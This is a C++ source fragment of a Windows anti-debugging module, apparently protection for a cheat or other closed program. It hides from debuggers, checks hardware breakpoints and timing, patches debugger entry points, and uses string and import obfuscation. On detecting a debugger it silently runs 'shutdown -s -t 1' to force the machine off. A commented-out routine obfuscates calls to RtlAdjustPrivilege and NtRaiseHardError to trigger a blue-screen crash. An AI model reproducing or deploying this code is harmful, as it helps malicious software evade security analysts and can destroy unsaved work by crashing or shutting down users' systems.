			WriteProcessMemory(GetCurrentProcess(), PRetAdress, &Patch, 1, NULL);

			VirtualProtect(PRetAdress, 1, dwOldProtect, &dwOldProtect);
		}
	}
}

bool debug_break()
{
	__try
	{
		DebugBreak();
	}
	__except (EXCEPTION_BREAKPOINT)
	{
		return false;
	}

	return true;
}

bool HardwareBpIsDbg() //object
{
	CONTEXT ctx = { 0 };
	bool is_hardware_bp = false;

	HANDLE thread = OpenThread(THREAD_ALL_ACCESS, FALSE, LI_FN(GetCurrentThreadId)());
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (LI_FN(GetThreadContext)(thread, &ctx)) 
	{
		is_hardware_bp = (ctx.Dr0 | ctx.Dr1 | ctx.Dr2 | ctx.Dr3) != 0;
	}
	LI_FN(CloseHandle)(thread);

	return is_hardware_bp;
}

bool AntidbgTimerCheck() //object
{
	static ULONGLONG time = 0;
	if (time == 0) 
	{
		time = __rdtsc();

		return false;
	}
	ULONGLONG second_time = __rdtsc();

	ULONGLONG diff = (second_time - time) >> 32;

	if (diff > 0x100) 
	{
		time = second_time;
		return true;
	}
	return false;
}

void api()
{
	load_debug_info();
	check_kuser_shared_data_structure();
	HeapProtect();
	CheckWrittenPages();
	RaiseExceptionPrint();
	RaiseException();
	HideFromDebuger(); //object
	IsCurrentSessionRemoteable(); //object
	if (CheckCsr())
		LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE); //object
	if (CloseHandleR())
		LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);//object
	if (HardwareBpIsDbg())
		LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);//object
	CheckPresent(); //flags
	HstCheck(); //flags
	OtherCheckFlags(); //flags
	AntiAnalisysProcess(); //flags
	AntiAnalisysWindow(); //flags
	//CheckGlobalFlagsClearInFile(); //flags
	CheckGlobalFlagsClearInProcess(); //flags
	PatchDbgBreakPoint(); //memory
	ApparateBreakPoint(); //memory
	PatchDbgUiRemoteBreakin(); //memory
	DontJump();  //memory
	isMemEddit(); //memory
	if (AntidbgTimerCheck())
		Shutdown();
	//if (DetectFunctionPatch())
	//	LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);//memory 
	WriteProcessMemory(); //memory
}

void threadd()
{
	while (true)
	{
		api();
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}
}

DWORD WINAPI MainThread(LPVOID)
{
	while (1)
	{
		debug_break();
		CheckWrittenPages();
		RaiseExceptionPrint();
		RaiseException();
		load_debug_info();
		check_kuser_shared_data_structure();
		HeapProtect();
		HideFromDebuger(); //object
		IsCurrentSessionRemoteable(); //object
		if (CheckCsr())
			LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE); //object
		if (CloseHandleR())
			LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);//object
		if (HardwareBpIsDbg())
			LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);//object
		CheckPresent(); //flags
		HstCheck(); //flags
		OtherCheckFlags(); //flags
		AntiAnalisysProcess(); //flags
		AntiAnalisysWindow(); //flags
		//CheckGlobalFlagsClearInFile(); //falgs
		CheckGlobalFlagsClearInProcess(); //flags
		PatchDbgBreakPoint(); //memory
		ApparateBreakPoint(); //memory
		PatchDbgUiRemoteBreakin(); //memory
		DontJump();  //memory
		isMemEddit(); //memory
		if (AntidbgTimerCheck())
			Shutdown();
	//	if (DetectFunctionPatch())
		//	LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);//memory 
		WriteProcessMemory(); //memory
		LI_FN(Sleep).cached()(200);
	}

	return 0;
}

/*






bool inst_prefix()
{
	__try
	{
		// 0xF3 0x64 disassembles as PREFIX REP:
		__asm __emit 0xF3
		__asm __emit 0x64
		// One byte INT 1
		__asm __emit 0xF1
		return true;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
}

bool popf_trap_flag()
{
	__try
	{
		__asm
		{
			pushfd
			mov dword ptr [esp], 0x100
			popfd
			nop
		}
		return true;
	}
	__except(GetExceptionCode() == EXCEPTION_SINGLE_STEP
		? EXCEPTION_EXECUTE_HANDLER
		: EXCEPTION_CONTINUE_EXECUTION)
	{
		return false;
	}
}

bool ice()
{
	__try
	{
		__asm __emit 0xF1;
		return true;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
}

bool int2d()
{
	__try
	{
		__asm xor eax, eax;
		__asm int 0x2d;
		__asm nop;
		return true;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
}

bool int3()
{
	__try
	{
		__asm int 3;
		return true;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}
}*/

/*bool is_ntglobal_flag() {
	DWORD pNtGlobalFlag = NULL;
	PPEB pPeb = (PPEB)__readfsdword(0x30);
	pNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0x68);
	return (pNtGlobalFlag & 0x70) != 0;
}*/

/*void bsod()
{
	auto dwA = ::GetModuleHandleA;
	auto dwB = ::GetProcAddress;

	DWORD a, b;

	const char aa[19] = { 0x52, 0x74, 0x6C, 0x41, 0x64, 0x6A, 0x75, 0x73, 0x74, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x00 };
	const char bb[17] = { 0x4E, 0x74, 0x52, 0x61, 0x69, 0x73, 0x65, 0x48, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00 };

	const char str_dec[10] = { 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C, 0x00 };

	__asm
	{
		lea ebx, str_dec
		push ebx
		call dwA
		mov ecx, eax

		lea eax, aa
		push eax
		push ecx
		call dwB

		lea ebx, a
		push ebx
		push 0
		push 1
		push 19
		call eax

		lea ebx, str_dec
		push ebx
		call dwA
		mov ecx, eax

		lea eax, bb
		push eax
		push ecx
		call dwB

		lea ebx, a
		push ebx
		push 6
		push 0
		push 0
		push 0
		push 0xC0000420L
		call eax
	}
}*/ //bsod x32
